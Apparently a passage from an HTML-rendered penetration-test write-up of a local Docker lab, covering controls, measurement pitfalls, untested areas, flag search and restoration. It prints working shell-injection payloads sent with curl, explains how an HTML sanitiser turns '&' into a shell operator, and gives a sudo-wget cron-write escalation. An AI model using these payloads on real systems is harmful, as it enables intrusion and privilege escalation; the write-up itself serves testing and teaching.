+<td><code>sudo -n /bin/sh -c id</code> → <code>sudo_sh_rc=1</code>, <code>sudo -n /usr/bin/id</code> → <code>sudo_id_rc=1</code>, stderr <code>sudo: a password is required</code> (×2). Policy is narrow and it held.</td>
+</tr>
+<tr>
+<td><strong>CGI execution is disabled.</strong> <code>printenv</code>, <code>test-cgi</code>, <code>printenv.vbs</code>, <code>printenv.wsf</code> sit in <code>cgi-bin</code> but do not execute.</td>
+<td><code>ScriptAlias /cgi-bin/</code> <strong>is</strong> registered (<code>httpd.conf:362</code>), so the location is live and reachable — the control being tested is <code>Options</code>/<code>AddHandler</code>, not the alias.</td>
+<td><code>httpd.conf:380</code> <code>Options None</code>; <code>httpd.conf:426</code> <code>#AddHandler cgi-script .cgi</code> (commented). All four paths → <code>HTTP 200</code> serving the script <strong>as plain text</strong>, first 60 bytes <code>## To permit this cgi, replace # on the first line above w</code>. 4 requests, 4 × ~1 KB. These are unmodified Apache defaults, so the source exposure is stock and is <strong>not</strong> filed as a finding.</td>
+</tr>
+<tr>
+<td><strong>The pickle service is not externally reachable.</strong></td>
+<td>A <code>6969/tcp</code> probe from outside returns <code>closed</code> (conn-refused, not <code>filtered</code>) — the bind address is loopback.</td>
+<td><code>nmap -Pn -p 6969 [net-0-7]</code> → <code>6969/tcp closed acmsoda</code>. 1 port, 1 refusal.</td>
+</tr>
+<tr>
+<td><strong>No UDP surface.</strong></td>
+<td><code>/proc/net/udp</code> and <code>/proc/net/udp6</code> both return <strong>0 rows</strong> — a measured empty, not an unrun scan.</td>
+<td>Empty file contents, 0 rows each.</td>
+</tr>
+<tr>
+<td><strong>The <code>matsi</code> home is not writable by other uids.</strong></td>
+<td>Paired detectors both fire in both directions: <code>test -w</code> returns 1 for <code>[lab-home]/matsi</code> and 0 for <code>/tmp</code>; <code>touch</code> returns 1 and 0 respectively; the files confirm it.</td>
+<td><code>matsi_writable=1 tmp_writable=0 matsi_touch_rc=1 tmp_touch_rc=0</code>, 2 paths tested per detector. This is what licensed the hop-2 and hop-3 oracles.</td>
+</tr>
+<tr>
+<td><strong>The project directory is private.</strong></td>
+<td>Same read attempted at the intended path and at the leftover one — opposite results, same file.</td>
+<td><code>apache_read_rc=1</code> (<code>Permission denied</code>) at <code>[lab-home]/matsi/proyect/app.py</code> vs <code>git_rc=0</code> via <code>/opt/.git</code>. The control held at its own path and was <strong>bypassed elsewhere</strong> — that contrast is F4, not a control.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>A control that did not hold, recorded separately because it looked like one:</strong> the
+shell injection <em>appears</em> to be defeated by <code>htmlspecialchars</code> — the page renders
+<code>&amp;lt;</code> <code>&amp;gt;</code> <code>&amp;#039;</code> <code>&amp;quot;</code> <code>&amp;amp;</code> correctly, which reads exactly like a filter
+working. It is not a filter in this context. §6.1 has the measurement.</p>
+<hr />
+<h2 id="6-instrumentation-defects">6. Instrumentation defects</h2>
+<p>Four, and the first one would have deleted a finding.</p>
+<h3 id="61-htmlspecialchars-turns--into-a-shell-control-operator--a-filter-shaped-negative-that-was-not-a-filter">6.1 <code>htmlspecialchars</code> turns <code>&amp;</code> into a shell control operator — a filter-shaped negative that was not a filter</h3>
+<p><code>htmlspecialchars()</code> escapes <code>&amp;</code> to <code>&amp;amp;</code>. The sink is a <strong>shell</strong>, where <code>&amp;</code> is the
+background operator. So the sanitiser does not block the injection — it silently
+<strong>restructures the attacker's command</strong>, and the visible effect is a file that does
+not grow.</p>
+<p>The first sign was a request that returned a fully rendered page and appended
+<strong>nothing</strong>: <code>names.txt</code> stayed at 2 lines / 93 bytes with an unchanged mtime. The
+naive conclusion is &quot;the filter blocked me&quot;, which would have closed F1 as a
+non-finding. Three legs, designed so the mechanism is the only explanation:</p>
+<p><strong>A — control, no <code>&amp;</code>, must reach the file:</strong></p>
+<pre><code>$ curl -X POST --data-urlencode 'nombre=A189b-$(echo FOREMARK189)' ...
+22:&lt;button onclick='button(&quot;A189b-FOREMARK189&quot;)'&gt;
+names.txt: 3 lines, 111 bytes   (grew)
+</code></pre>
+<p><strong>B — same subshell plus one literal <code>&amp;</code> (becomes <code>&amp;amp;</code>):</strong></p>
+<pre><code>$ curl -X POST --data-urlencode 'nombre=A189c-$(sleep 4; echo BGMARK189)&amp;' ...
+elapsed=4.10 s
+22:&lt;button onclick='button(&quot;A189b-FOREMARK189&quot;)'&gt;      &lt;- stale, unchanged
+names.txt: 3 lines, 111 bytes                          &lt;- grew by 0
+</code></pre>
+<p><strong>C — the backgrounded child must have run, and as whom:</strong></p>
+<pre><code>$ curl -X POST --data-urlencode 'nombre=A189g-&amp;$(id | tee /tmp/bg189.txt)' ...
+$ ls -l /tmp/bg189.txt
+-rw-r--r-- 1 apache apache 76 ... /tmp/bg189.txt
+$ cat /tmp/bg189.txt
+uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)$
+</code></pre>
+<p>A and B differ by one character. A grows the file; B grows it by <strong>0 bytes</strong> while
+<strong>still spending 4.10 s</strong> — the <code>sleep</code> ran, and the request blocked on it. C then
+proves the command <em>did</em> execute as <code>apache</code> and wrote a file readable from outside,
+while the sink's own file stayed untouched.</p>
+<p><strong>Mechanism, in full:</strong> <code>&amp;amp;</code> reaches <code>/bin/sh</code>, which tokenises <code>&amp;</code> as a
+background operator and splits the command in two. The redirect <code>&gt;&gt; names.txt</code>,
+which belongs to the <em>sink's</em> command line, is then attached to the trailing
+<code>amp;</code> word-command, which produces no output — so <strong>0 bytes</strong> are appended. The
+backgrounded child inherits PHP's <code>system()</code> stdout <strong>pipe</strong>, and PHP blocks on that
+pipe until EOF, which is why the request still takes the child's full 4 s. The 4.10 s
+is the tell; the missing line is not.</p>
+<p><strong>Generalisable rule, and the reason this is worth a section:</strong> <em>a sanitiser that
+rewrites its input can change the parse of the language it did not validate.</em> Any
+negative whose evidence is &quot;the expected output did not appear&quot; must be re-run with a
+positive control on the same detector before it is allowed to become a finding of
+absence. Here the positive control (A) and the negative (B) differ by one character,
+which is exactly the situation where a &quot;blocked&quot; reading is most tempting and least
+supported.</p>
+<p><strong>Practical consequence I hit twice:</strong> because <code>&gt;</code> and <code>&amp;</code> are both escaped, the
+usual shell idioms <code>2&gt;&amp;1</code> and <code>cmd &gt; file</code> are <strong>unavailable inside the injection</strong>.
+I lost one cycle to a payload containing <code>2&gt;&amp;1</code>, and one to a <code>;</code>-list whose trailing
+redirect bound only to the last simple command. Both are the same defect seen from
+the other side. Workarounds that need no <code>&gt;</code>: <code>tee</code> for files, <code>$( )</code> for capture, and
+<code>$?</code> for the exit status instead of stderr text.</p>
+<h3 id="62-gits-safedirectory-refusal-exits-0-and-produces-empty-stdout">6.2 <code>git</code>'s <code>safe.directory</code> refusal exits 0 and produces empty stdout</h3>
+<p>The same command, two identities, opposite answers:</p>
+<pre><code># as root (owns /opt/.git, so no gate):
+$ git -C /opt cat-file -s HEAD:objetivos.bin
+29
+$ git -C /opt cat-file -p HEAD:objetivos.bin | od -c
+0000000  \0  \0  \0 031   T   e   r   m   i   n   a   r ...   g   i   t  \n
+
+# as apache:
+$ su -s /bin/sh apache -c &quot;git -C /opt cat-file -p HEAD:objetivos.bin | od -c&quot;
+fatal: detected dubious ownership in repository at '/opt'      &lt;- STDERR
+0000000                                                          &lt;- 0 bytes on STDOUT
+apache_pipeline_rc=0                                             &lt;- exit 0
+</code></pre>
+<p>The blob is <strong>29 bytes</strong>, not empty. Had I run the first version of this check as
+<code>apache</code> and read the <code>od -c</code> line, I would have reported the committed artefact as
+empty — a <strong>work count of 0</strong> presented as a result. This is the same shape as the
+catalogued <code>find -writable</code> defect: a refusal that reports itself as an ordinary empty
+result, <strong>and exits 0</strong>. The <code>| od -c</code> pipeline hides it further, because the exit
+status the shell reports is <code>od</code>'s, not <code>git</code>'s.</p>
+<p><strong>Rule:</strong> a pipe is not an error channel. <code>2&gt;&amp;1</code> before concluding anything, and
+compare the byte count against a run as an identity that is not gated.</p>
+<h3 id="63-busybox-wget-has-no-file-scheme">6.3 busybox <code>wget</code> has no <code>file://</code> scheme</h3>
+<pre><code>$ wget -q -O /tmp/wtest189.txt file:///etc/hostname
+file_rc=1
+$ wc -c /tmp/wtest189.txt
+0 /tmp/wtest189.txt
+</code></pre>
+<p>Zero bytes fetched, <code>rc=1</code>. Had I not checked the byte count I would have read
+<code>rc=1</code> as &quot;the file is unreadable&quot; and gone looking for a permissions bug. The scheme
+simply does not exist in this build (<code>Usage: base64 [-d] [-w COL] [FILE]</code> style
+busybox applet help confirms the reduced feature set). The escalation therefore had
+to fetch over <strong>HTTP</strong> from the engagement host — which is also why F5's evidence
+includes a successful <code>wget</code> of a real 94-byte document from <code>[net-0-1]</code>.</p>
+<h3 id="64-tooling-absent-in-the-measurement-environment-and-one-blocked-read">6.4 Tooling absent in the measurement environment, and one blocked read</h3>
+<table>
+<thead>
+<tr>
+<th>Attempt</th>
+<th>What happened</th>
+<th>How it was caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>curl</code> inside the container to probe <code>/cgi-bin/*</code></td>
+<td><code>bash: line 3: curl: command not found</code> — <strong>0 requests, 0 bytes, no status code</strong></td>
+<td>The output was a blank HTTP field and <code>0 bytes</code>, i.e. a <strong>zero work count</strong>. Re-run from the host against <code>[net-0-7]</code>: 4 requests, 4 × ~1 KB, real status codes. A blank result is not a negative.</td>
+</tr>
+<tr>
+<td><code>readlink /proc/18/cwd</code>, <code>tr &lt;/proc/18/environ</code></td>
+<td><code>Permission denied</code> even as container root</td>
+<td>Not chased. The value was obtained <strong>from inside the sink instead</strong> — the pickle RCE runs <code>pwd</code> in the app's own context, which is a better measurement than reading <code>/proc</code> would have been.</td>
+</tr>
+<tr>
+<td><code>rtk</code> used inside <code>docker exec</code></td>
+<td><code>bash: line 1: rtk: command not found</code></td>
+<td><code>rtk</code> is a host-side shim; the first two <code>ls</code> calls silently returned nothing and I only noticed because the output was empty where a file listing was expected. Every container-side command was re-run without it.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="7-not-tested-vs-discarded-with-reason">7. NOT tested, vs discarded with reason</h2>
+<h3 id="71-not-tested-no-conclusion-claimed">7.1 NOT tested (no conclusion claimed)</h3>
+<ul>
+<li><strong>UDP services beyond the empty <code>/proc/net/udp{,6}</code>.</strong> The tables returned 0 rows,
+which is a strong negative, but I did not attempt a UDP sweep — so &quot;no UDP service
+exists&quot; is a statement about the kernel's view, not about packets in flight.</li>
+<li><strong>Exploitation of the <code>printenv</code> / <code>test-cgi</code> scripts as CGI.</strong> Confirmed not
+executed (§5). I did not try to enable CGI or find another handler, and I make no
+claim about what they would do if enabled.</li>
+<li><strong><code>app.py</code> menu branches other than <code>1</code> and <code>2</code>,</strong> and the <code>&quot;Opción inválida&quot;</code> arm
+at <code>app.py:79-80</code>.</li>
+<li><strong>The 4096-byte boundary of <code>recv_bytes</code> (<code>app.py:19</code>).</strong> My largest frame was
+559 bytes. Whether a frame larger than 4096 bytes is silently truncated — and
+therefore whether a length prefix and its payload can desynchronise — is untested.
+I flag it as a likely second-order bug in F2, not as a result.</li>
+<li><strong>The <code>run-parts</code> jobs in root's crontab</strong> (<code>/etc/crontab</code>, <code>*/15</code>, hourly, daily,
+weekly, monthly). Not read, not tested, no claim.</li>
+<li><strong><code>/opt</code>'s purpose.</strong> <code>/opt</code> contains only <code>.git</code> and no working tree. I did not
+investigate the build history; F4 reports the disclosure, not a motive.</li>
+<li><strong>Any second host.</strong> <code>auto_deploy.sh</code> does not exist in this image and
+<code>ExposedPorts</code> is empty, so I found no evidence of a multi-container topology. If
+one exists behind this image, I did not see it.</li>
+</ul>
+<h3 id="72-discarded-with-reason">7.2 Discarded, with reason</h3>
+<ul>
+<li><strong>Chaining <code>F1</code> straight to root.</strong> <code>apache</code> has no sudo rule, no SUID binary
+(<code>find / -xdev \( -perm -4000 -o -perm -2000 \)</code> → <code>/usr/bin/crontab</code>, <code>/usr/bin/sudo</code>,
+<code>/usr/sbin/suexec</code>, <code>/bin/bbsuid</code> only, all standard setuid or setgid with no
+escalation path) and no file capabilities (<code>getcap -r /</code> → empty). Discarded as
+impossible, not merely unattempted.</li>
+<li><strong>Getting root out of the pickle sink alone.</strong> F2's ceiling is <code>matsi</code>, measured
+three times. The lab description says otherwise (§2.1); I followed the measurement.
+This is a <strong>discarded hypothesis with a reason</strong>, and the reason is a positive
+result about F5.</li>
+<li><strong>A pre-seeded malicious pickle in the image.</strong> The <code>objetivos.bin</code> committed in
+<code>/opt/.git</code> looked like a candidate payload. It is not: it is 29 bytes of
+<code>00000019</code> + <code>Terminar mi proyecto git.\n</code> — an author's note, and not even a valid
+pickle, so feeding it to <code>app.py:43</code> would raise. Discarded after reading its bytes.</li>
+<li><strong><code>/opt/.git</code> as a privilege-escalation vector.</strong> Its objects are root-owned
+<code>-rw-r--r--</code> and <code>/opt</code> is not writable by <code>matsi</code> or <code>apache</code>, so no object can be
+replaced. It is an information-disclosure finding (F4), not an escalation.</li>
+<li><strong>A <code>matsi</code>-writable <code>authorized_keys</code>.</strong> Not applicable: there is no SSH server
+listening (only 80/tcp externally) and no <code>.ssh</code> directory.</li>
+<li><strong>Container escape.</strong> Not attempted and not claimed. The container is unprivileged
+by the RUNBOOK's own criteria and nothing in the engagement pointed at it.</li>
+</ul>
+<hr />
+<h2 id="8-reward">8. Reward</h2>
+<p><strong>There is no reward in this lab.</strong> Reported as a measured absence, with the search
+that establishes it — a lab with no reward, countable from the <code>FLAG{}</code> column of
+<code>corpus/INDEX.md</code> rather than asserted as a position, and the
+twenty-seventh of thirty-four writeups.</p>
+<ul>
+<li><strong>Exhaustive shortlist, not a name guess.</strong> The box has <strong>1827 files</strong> total. After
+excluding the OS (<code>/usr</code>, <code>/lib</code>, <code>/lib32</code>, <code>/etc</code>, <code>/bin</code>, <code>/sbin</code>, <code>/var/lib</code>,
+<code>/var/cache</code>, <code>/tmp</code>), <strong>75 files</strong> remain, and all 75 were listed and read. They
+are: the two git repositories, <code>app.py</code>, <code>entrypoint.sh</code>, the 5 web files, the 4
+stock Apache CGI scripts, the 3 logs, the 3 pid files, and the artefacts I created.</li>
+<li><strong>Name sweep:</strong> <code>flag*</code>, <code>*reward*</code>, <code>*secret*</code>, <code>*.token</code>, <code>user.txt</code>,
+<code>proof.txt</code>, <code>*.key</code>, case-insensitive, across all 1827 files → <strong>0 hits</strong> outside
+<code>/usr</code>, <code>/lib*</code>, <code>/etc/ssl</code>, <code>/etc/pki</code>.</li>
+<li><strong>Content sweep:</strong> 8 literal patterns — <code>FLAG{</code>, <code>flag{</code>, <code>CTF{</code>, <code>HTB{</code>,
+<code>DOCKERLABS</code>, <code>REWARD</code>, <code>congratul</code>, <code>felicita</code> — over <code>/home</code>, <code>/opt</code>, <code>/var/www</code>,
+<code>/srv</code>, <code>/run</code>, <code>/media</code>, <code>/mnt</code> → <strong>0 files each, 8 × 75 = 600 pattern-file
+tests, 0 hits.</strong></li>
+<li><strong>The two files that look like rewards are mine,</strong> and I say so rather than
+reporting them: <code>[lab-home]/matsi/pickle189.proof</code> and <code>/root/root189.proof</code>, both
+written by this engagement. A reward-shaped file that the tester created is the
+textbook way to invent one. Both were absent before the run and both are gone after
+the restore (§10), verified by name.</li>
+<li><code>/root</code> contains only <code>entrypoint.sh</code> and, during the run, my proof file. No flag.</li>
+</ul>
+<hr />
+<h2 id="9-notes-for-the-methodology">9. Notes for the methodology</h2>
+<p>Three things here are worth carrying forward, and none of them is &quot;a new class&quot;:</p>
+<ol>
+<li><strong>A sanitiser that rewrites its input changes the parse of the language it did not
+validate</strong> (§6.1). <code>&amp;</code> → <code>&amp;amp;</code> became a shell background operator, producing a
+perfect &quot;the filter blocked it&quot; negative while the payload executed. The
+discriminator is cheap: a control and a negative that differ by <strong>one character</strong>,
+with an exit-status or timing side-channel. Add it next to the existing
+&quot;previene vs detecta&quot; row (labs 283, 218).</li>
+<li><strong>Measure the deserialisation sink's identity, and do not inherit the lab's
+account of it</strong> (§2.1). This lab declares &quot;pickle → root&quot; and delivers
+&quot;pickle → <code>matsi</code>&quot;, with a third unrelated sudoers bug supplying root. The
+descriptor is a claim about the author's intent; the <code>id</code> inside the sink is a
+measurement. <code>corpus/INDEX.md:35</code> already attributes pickle to lab 148; this lab
+widens that class from <em>gadget-in-memory-corruption</em> to <em><code>pickle.loads</code> on network
+bytes</em>, which is CWE-502 in its own right.</li>
+<li><strong>A <code>sudoers</code> entry without an argument list is not the command it names.</strong>
+<code>NOPASSWD: /usr/bin/wget</code> is a root file-write primitive
+(<code>sudo wget -O /etc/cron.d/x http://…</code>). It reads as a narrow grant and is not one.
+When a lab's declared escalation does not fire, read <code>/etc/sudoers</code> before
+concluding the escalation is unavailable — and check whether the command's own
+capabilities exceed what its name suggests.</li>
+</ol>
+<hr />
+<h2 id="10-restoration">10. Restoration</h2>
+<p>Recreated from the image, not by undoing edits.</p>
+<pre><code>$ docker rm -f rolarola_container &amp;&amp; docker run -d --name rolarola_container -p 18089:80 rolarola:latest
+</code></pre>
+<p>Verified with <strong>positive</strong> checks, each carrying a work count:</p>
+<table>
+<thead>
+<tr>
+<th>Check</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Counter back to its shipped value</td>
+<td><code>names.txt</code> was <strong>3084 bytes</strong> after the run; now <code>0</code> bytes, mtime back to <code>Dec 29 2025</code></td>
+</tr>
+<tr>
+<td>Every artefact I created, by name</td>
+<td><strong>17 of 17 absent</strong> — <code>p189.py</code>, <code>p189c.py</code>, <code>cmd189.txt</code>, <code>run189.txt</code>, <code>run189c.txt</code>, <code>env189.txt</code>, <code>bg189.txt</code>, <code>neg189.txt</code>, <code>apache_can189.proof</code>, <code>wtest189.txt</code>, <code>sudow189.txt</code>, <code>probe189.txt</code>, <code>err189.txt</code>, <code>pickle189.proof</code>, <code>apache_cannot.proof</code>, <code>root189.proof</code>, <code>/etc/cron.d/p189</code></td>
+</tr>
+<tr>
+<td>Data file I appended to</td>
+<td><code>[lab-home]/matsi/objetivos.bin</code> — <code>No such file or directory</code> (my frames are gone; it did not ship)</td>
+</tr>
+<tr>
+<td>Service answering again</td>
+<td><code>GET /</code> → <code>HTTP 200</code>, <strong>478 bytes</strong> — byte-identical to the pre-engagement fetch</td>
+</tr>
+<tr>
+<td>The hidden service is back</td>
+<td><code>ps</code>: <code>45 matsi python3 [lab-home]/matsi/proyect/app.py</code>; <code>/proc/net/tcp</code> → <code>0100007F:1B39</code> <code>LISTEN</code> <strong>uid 1000</strong></td>
+</tr>
+<tr>
+<td>External surface unchanged</td>
+<td><code>nmap -sV -Pn -p- --open</code> → <code>80/tcp open http Apache httpd 2.4.66</code>, <code>65534 closed</code></td>
+</tr>
+</tbody>
+</table>
+<p>The <code>app.py</code> check is the one worth calling out: it comes up from <strong>matsi's crontab</strong>,
+not from the entrypoint, so it is absent for up to a minute after <code>docker run</code> and a
+naive &quot;is it restored?&quot; check run immediately would have reported a false negative.
+It was polled to a positive, not assumed.</p>
+<p><strong>Host-side cleanup:</strong> the <code>python3 -m http.server 9099</code> used as the <code>wget</code> source is
+stopped and port 9099 is closed. Other <code>http.server</code> processes on this machine belong
+to other projects and were left alone. <code>pkill -f 'http.server 9099'</code> matched <strong>its own
+shell</strong> — the pattern is in the command line — and killed the session mid-command; the
+restore had to be re-run afterwards. Worth remembering: <code>pkill -f</code> on a pattern you
+just typed is a self-kill, and it silently ate a whole step.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
